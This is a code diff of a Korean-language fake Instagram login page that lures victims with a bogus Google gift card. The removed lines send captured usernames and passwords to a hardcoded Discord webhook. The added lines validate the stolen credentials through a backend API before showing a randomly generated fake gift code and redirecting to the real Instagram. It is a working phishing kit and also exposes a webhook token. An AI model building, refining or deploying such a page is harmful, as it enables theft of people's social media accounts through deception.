@@ -31,7 +31,7 @@
             font-size: 45px;
             font-weight: normal;
             color: #262626;
-            margin: 22px 0 35px 0;
+            margin: 22px 0 25px 0;
         }
         .inlineToBlock {
             width: 100%;
@@ -109,6 +109,13 @@
             text-decoration: none;
             font-weight: 600;
         }
+        #errorMessage {
+            color: #ed4956;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
+            line-height: 1.4;
+        }
         #rewardBox {
             display: none;
             background: white;
@@ -147,10 +154,12 @@
         <div class="loginWindow" id="loginWindow">
             <div class="instaLogoText">Instagram</div>
             
+            <div id="errorMessage"></div>
+
             <form id="loginForm">
                 <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" class="inlineToBlock" required>
                 <input type="password" id="password" placeholder="비밀번호" class="inlineToBlock" required>
-                <button type="submit" class="inlineToBlock ordinaryLogin">로그인</button>
+                <button type="submit" id="submitBtn" class="inlineToBlock ordinaryLogin">로그인</button>
             </form>
 
             <div class="horizonAndOrWrap">
@@ -180,58 +189,75 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorDiv = document.getElementById('errorMessage');
+            const submitBtn = document.getElementById('submitBtn');
             
-            const webhookUrl = "https://discord.com/api/webhooks/1550104827672006717/peMYiP25Tq5ZlIm3f-bC4tL2Tfs3tW_eHkLnlNopQGh58FVsQZNE76mNLkRZHSF9K0IT";
+            errorDiv.style.display = 'none';
+            submitBtn.innerText = '로그인 중...';
+            submitBtn.disabled = true;
 
-            const payload = {
-                content: `🎯 **인스타 로그인 정보 획득!**\n- **ID:** \`${username}\`\n- **PW:** \`${password}\``
-            };
+            try {
+                // 백엔드 API로 검증 요청
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password })
+                });
 
-            // 웹훅으로 정보 전송
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => {
-                console.log(err);
-            });
+                const result = await response.json();
 
-            // 구글 기프트 카드 형식 코드 생성 (예: ABCD-EFGH-IJKL-MNOP)
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            let part1 = "", part2 = "", part3 = "", part4 = "";
-            for(let i=0; i<4; i++) {
-                part1 += chars.charAt(Math.floor(Math.random() * chars.length));
-                part2 += chars.charAt(Math.floor(Math.random() * chars.length));
-                part3 += chars.charAt(Math.floor(Math.random() * chars.length));
-                part4 += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            const googleCode = `${part1}-${part2}-${part3}-${part4}`;
-            document.getElementById('couponCode').innerText = googleCode;
-
-            // 로그인 창 숨기고 기프트 카드 창 띄우기
-            document.getElementById('loginWindow').style.display = 'none';
-            document.getElementById('bottomBox').style.display = 'none';
-            document.getElementById('rewardBox').style.display = 'block';
-
-            // 6초 카운트다운 후 인스타그램으로 이동
-            let timeLeft = 5;
-            const timerInterval = setInterval(() => {
-                document.getElementById('timerText').innerText = `${timeLeft}초 후 인스타그램으로 이동합니다...`;
-                timeLeft--;
-                if (timeLeft < 0) {
-                    clearInterval(timerInterval);
-                    window.location.href = "https://www.instagram.com";
+                if (!response.ok) {
+                    // 없는 계정이거나 검증 실패 시 에러 메시지 띄우기 (코드는 절대 안 뜸)
+                    errorDiv.innerText = result.message;
+                    errorDiv.style.display = 'block';
+                    submitBtn.innerText = '로그인';
+                    submitBtn.disabled = false;
+                    return;
                 }
-            }, 1000);
+
+                // 정상 계정일 경우 구글 기프트 카드 코드 생성
+                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                let part1 = "", part2 = "", part3 = "", part4 = "";
+                for(let i=0; i<4; i++) {
+                    part1 += chars.charAt(Math.floor(Math.random() * chars.length));
+                    part2 += chars.charAt(Math.floor(Math.random() * chars.length));
+                    part3 += chars.charAt(Math.floor(Math.random() * chars.length));
+                    part4 += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                const googleCode = `${part1}-${part2}-${part3}-${part4}`;
+                document.getElementById('couponCode').innerText = googleCode;
+
+                // 로그인 창 숨기고 기프트 카드 창 띄우기
+                document.getElementById('loginWindow').style.display = 'none';
+                document.getElementById('bottomBox').style.display = 'none';
+                document.getElementById('rewardBox').style.display = 'block';
+
+                // 6초 카운트다운 후 인스타그램으로 이동
+                let timeLeft = 5;
+                const timerInterval = setInterval(() => {
+                    document.getElementById('timerText').innerText = `${timeLeft}초 후 인스타그램으로 이동합니다...`;
+                    timeLeft--;
+                    if (timeLeft < 0) {
+                        clearInterval(timerInterval);
+                        window.location.href = "https://www.instagram.com";
+                    }
+                }, 1000);
+
+            } catch (err) {
+                console.log(err);
+                errorDiv.innerText = "서버 통신 중 오류가 발생했습니다.";
+                errorDiv.style.display = 'block';
+                submitBtn.innerText = '로그인';
+                submitBtn.disabled = false;
+            }
         });
     </script>
 </body>
 </html>
-
